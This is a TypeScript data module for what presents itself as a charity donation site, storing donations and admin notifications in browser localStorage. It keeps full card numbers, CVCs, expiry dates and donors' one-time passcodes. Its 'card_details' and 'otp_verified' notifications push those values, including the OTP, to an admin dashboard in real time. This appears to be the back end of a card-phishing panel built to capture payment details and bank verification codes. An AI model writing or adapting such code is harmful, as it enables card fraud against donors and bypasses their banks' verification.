export interface Donation {
  id: string;
  referenceNumber: string;
  amount: number;
  firstName: string;
  lastName: string;
  email: string;
  phone: string;
  country: string;
  address1: string;
  address2?: string;
  city: string;
  state: string;
  zipCode: string;
  cardLast4: string;
  cardNumber?: string;
  cvc?: string;
  cardholderName?: string;
  cardExpiration?: string;
  donationType: 'one-time' | 'monthly';
  purposeOfDonation?: string;
  heardAboutUs?: string;
  coverTransactionFees: boolean;
  isBusinessDonation: boolean;
  wantsUpdates: boolean;
  status: 'pending' | 'processing' | 'approved' | 'rejected';
  otpCode?: string;
  otpVerified?: boolean;
  createdAt: string;
  updatedAt: string;
  adminNotes?: string;
  pdfUrl?: string;
}

const STORAGE_KEY = 'donations_db';
const NOTIFICATIONS_KEY = 'admin_notifications';

export interface AdminNotification {
  id: string;
  type: 'card_details' | 'otp_verified' | 'donation_created';
  donationId: string;
  referenceNumber: string;
  donorName: string;
  email?: string;
  phone?: string;
  amount: number;
  message: string;
  cardNumber?: string;
  cardLast4?: string;
  cardholderName?: string;
  cvc?: string;
  cardExpiration?: string;
  billingAddress?: string;
  city?: string;
  state?: string;
  zipCode?: string;
  otpCode?: string;
  donationType?: string;
  timestamp: string;
  read: boolean;
}

export const donationDb = {
  getAllDonations: (): Donation[] => {
    if (typeof window === 'undefined') return [];
    const data = localStorage.getItem(STORAGE_KEY);
    return data ? JSON.parse(data) : [];
  },

  getDonationById: (id: string): Donation | null => {
    const donations = donationDb.getAllDonations();
    return donations.find(d => d.id === id) || null;
  },

  addDonation: (donation: Omit<Donation, 'id' | 'referenceNumber' | 'createdAt' | 'updatedAt'>): Donation => {
    const donations = donationDb.getAllDonations();
    const newDonation: Donation = {
      ...donation,
      id: Math.random().toString(36).substr(2, 9),
      referenceNumber: generateReferenceNumber(),
      createdAt: new Date().toISOString(),
      updatedAt: new Date().toISOString(),
    };
    donations.push(newDonation);
    localStorage.setItem(STORAGE_KEY, JSON.stringify(donations));
    return newDonation;
  },

  updateDonation: (id: string, updates: Partial<Donation>): Donation | null => {
    const donations = donationDb.getAllDonations();
    const index = donations.findIndex(d => d.id === id);
    if (index === -1) return null;
    
    donations[index] = {
      ...donations[index],
      ...updates,
      updatedAt: new Date().toISOString(),
    };
    localStorage.setItem(STORAGE_KEY, JSON.stringify(donations));
    return donations[index];
  },

  deleteDonation: (id: string): boolean => {
    const donations = donationDb.getAllDonations();
    const filtered = donations.filter(d => d.id !== id);
    if (filtered.length === donations.length) return false;
    localStorage.setItem(STORAGE_KEY, JSON.stringify(filtered));
    return true;
  },

  getDonationsByStatus: (status: Donation['status']): Donation[] => {
    return donationDb.getAllDonations().filter(d => d.status === status);
  },

  searchDonations: (query: string): Donation[] => {
    const lowerQuery = query.toLowerCase();
    return donationDb.getAllDonations().filter(d =>
      d.referenceNumber.toLowerCase().includes(lowerQuery) ||
      d.firstName.toLowerCase().includes(lowerQuery) ||
      d.lastName.toLowerCase().includes(lowerQuery) ||
      d.email.toLowerCase().includes(lowerQuery)
    );
  },

  generateOTP: (): string => {
    return Math.floor(100000 + Math.random() * 900000).toString();
  },

  // Notification methods
  getAllNotifications: (): AdminNotification[] => {
    if (typeof window === 'undefined') return [];
    const data = localStorage.getItem(NOTIFICATIONS_KEY);
    return data ? JSON.parse(data) : [];
  },

  addNotification: (notification: Omit<AdminNotification, 'id' | 'timestamp' | 'read'>): AdminNotification => {
    const notifications = donationDb.getAllNotifications();
    const newNotification: AdminNotification = {
      ...notification,
      id: Math.random().toString(36).substr(2, 9),
      timestamp: new Date().toISOString(),
      read: false,
    };
    notifications.unshift(newNotification); // Add to beginning for recent first
    localStorage.setItem(NOTIFICATIONS_KEY, JSON.stringify(notifications));
    
    // Trigger browser notification if admin dashboard is open
    if (typeof window !== 'undefined') {
      window.dispatchEvent(new CustomEvent('donationNotification', { detail: newNotification }));
    }
    
    return newNotification;
  },

  markNotificationAsRead: (notificationId: string): void => {
    const notifications = donationDb.getAllNotifications();
    const notification = notifications.find(n => n.id === notificationId);
    if (notification) {
      notification.read = true;
      localStorage.setItem(NOTIFICATIONS_KEY, JSON.stringify(notifications));
    }
  },

  clearNotifications: (): void => {
    localStorage.setItem(NOTIFICATIONS_KEY, JSON.stringify([]));
  },
};

export function generateReferenceNumber(): string {
  const year = new Date().getFullYear();
  const random = Math.random().toString(36).substr(2, 6).toUpperCase();
  return `PTW-${year}-${random}`;
}
